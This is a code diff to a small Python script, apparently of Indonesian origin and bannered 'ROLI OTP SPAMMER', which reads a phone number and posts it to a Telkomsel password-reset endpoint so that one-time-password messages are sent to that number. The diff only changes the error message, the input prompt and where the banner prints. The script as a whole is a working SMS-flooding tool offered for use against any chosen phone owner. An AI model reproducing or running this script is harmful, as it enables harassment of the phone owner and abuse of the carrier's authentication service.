@@ -2,15 +2,16 @@
 # ga usah di recode capek w bikin
 try:
 	from requests import post
-except Exception:
-	   print ("modul requests belom di install")
+except Exception as x:
+	   print ("modul err0r %s"% (x))
 class roli:
 	  urlz = "https://roli.telkomsel.com/auth/forgot_password"
-print ("""
-< ROLI OTP SPAMMER >
-< POWERED BY ZSECC0DE-CREW.ID
-""")
-o = input("nomor here :")
-fuck = {'msisdn': o}
+o = input("Masukkan Number :")
+fuck = {'msisdn':o}
 ajg = post(roli.urlz,fuck)
-print ("STATUS:",ajg.json()["message"])
+print (ajg.json()["message"])
+if __name__ == '__main__':
+	print ("""
+    < ROLI OTP SPAMMER >
+    < POWERED BY ZSECC0DE-CREW.ID
+    """)
